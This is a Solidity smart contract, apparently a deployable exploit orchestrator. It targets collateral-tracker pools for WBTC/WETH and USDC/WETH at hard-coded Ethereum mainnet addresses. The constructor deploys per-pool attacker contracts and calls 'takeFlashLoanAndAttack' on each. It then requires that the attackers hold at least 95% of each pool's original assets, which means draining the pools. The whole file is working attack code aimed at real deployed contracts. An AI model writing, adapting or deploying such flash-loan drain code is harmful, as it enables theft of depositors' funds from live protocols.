// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";

import {USDC_WETH30bpsMainnetAttacker} from "./Deployable_USDC_WETH30bpsMainnetAttacker.sol";
import {WBTC_WETH30bpsMainnetAttacker} from "./Deployable_WBTC_WETH30bpsMainnetAttacker.sol";
/* import {TBTC_WETH30bpsMainnetAttacker} from "./Deployable_TBTC_WETH30bpsMainnet.sol"; */

contract MultipoolMainnetAttacker {
    WBTC_WETH30bpsMainnetAttacker public wbtcWethAttacker;
    USDC_WETH30bpsMainnetAttacker public usdcWethAttacker;
    /* TBTC_WETH30bpsMainnetAttacker public tbtcWethAttacker; */

    ICollateralTracker wbtcWethCT0 = ICollateralTracker(0xb310cf625f519DA965c587e22Ff6Ecb49809eD09);
    ICollateralTracker wbtcWethCT1 = ICollateralTracker(0x1F8D600A0211DD76A8c1Ac6065BC0816aFd118ef);
    ICollateralTracker usdcWethCT0 = ICollateralTracker(0xc74dC5908E3E421004f533287c052bF0cc42ddc1);
    ICollateralTracker usdcWethCT1 = ICollateralTracker(0x351eFb333885c5351418aE0134dd54cac0B3143F);
    /* ICollateralTracker tbtcWethCT0 = ICollateralTracker(0xD832250205607FAFcf01c94971af0295f08aC631);
    ICollateralTracker tbtcWethCT1 = ICollateralTracker(0xe0b058AEbFed7e03494dA2644380F8C0BC706F1e); */

    constructor(address _withdrawer) {
        IERC20Partial wbtc = IERC20Partial(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        IERC20Partial weth = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // weth
        IERC20Partial usdc = IERC20Partial(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // usdc
        /* IERC20Partial tbtc = IERC20Partial(0x18084fbA666a33d37592fA2633fD49a74DD93a88); // tbtc */
        (uint256 wbtcWeth_poolAssets0Before, , ) = wbtcWethCT0.getPoolData();
        (uint256 wbtcWeth_poolAssets1Before, , ) = wbtcWethCT1.getPoolData();
        (uint256 usdcWeth_poolAssets0Before, , ) = usdcWethCT0.getPoolData();
        (uint256 usdcWeth_poolAssets1Before, , ) = usdcWethCT1.getPoolData();
        /* (uint256 tbtcWeth_poolAssets0Before, , ) = tbtcWethCT0.getPoolData();
        (uint256 tbtcWeth_poolAssets1Before, , ) = tbtcWethCT1.getPoolData(); */

        wbtcWethAttacker = new WBTC_WETH30bpsMainnetAttacker(_withdrawer);
        usdcWethAttacker = new USDC_WETH30bpsMainnetAttacker(_withdrawer);
        /* tbtcWethAttacker = new TBTC_WETH30bpsMainnetAttacker(_withdrawer); */

        wbtcWethAttacker.takeFlashLoanAndAttack();
        usdcWethAttacker.takeFlashLoanAndAttack();
        /* tbtcWethAttacker.takeFlashLoanAndAttack(); */

        uint256 wbtcWeth_attackerBalance0 = wbtc.balanceOf(address(wbtcWethAttacker));
        uint256 wbtcWeth_attackerBalance1 = weth.balanceOf(address(wbtcWethAttacker));
        uint256 usdcWeth_attackerBalance0 = usdc.balanceOf(address(usdcWethAttacker));
        uint256 usdcWeth_attackerBalance1 = weth.balanceOf(address(usdcWethAttacker));
        /* uint256 tbtcWeth_attackerBalance0 = tbtc.balanceOf(address(tbtcWethAttacker));
        uint256 tbtcWeth_attackerBalance1 = weth.balanceOf(address(tbtcWethAttacker)); */

        require(wbtcWeth_attackerBalance0 >= (wbtcWeth_poolAssets0Before * 95) / 100);
        require(wbtcWeth_attackerBalance1 >= (wbtcWeth_poolAssets1Before * 95) / 100);
        require(usdcWeth_attackerBalance0 >= (usdcWeth_poolAssets0Before * 95) / 100);
        require(usdcWeth_attackerBalance1 >= (usdcWeth_poolAssets1Before * 95) / 100);
        /* require(tbtcWeth_attackerBalance0 >= (tbtcWeth_poolAssets0Before * 95) / 100);
        require(tbtcWeth_attackerBalance1 >= (tbtcWeth_poolAssets1Before * 95) / 100); */
    }
}
